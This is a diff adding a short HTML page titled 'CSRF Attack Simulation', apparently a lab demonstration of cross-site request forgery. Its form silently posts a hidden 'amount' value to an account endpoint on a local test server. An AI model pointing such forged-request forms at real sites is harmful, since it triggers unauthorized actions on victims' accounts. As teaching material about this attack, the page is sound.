@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>CSRF Attack Simulation</h1>
+    <form action="http://127.0.0.1:5000/account/user1" method="post">
+        <input type="hidden" name="amount" value="100">
+        <input type="submit" value="Submit">
+    </form>
+</body>
+</html>
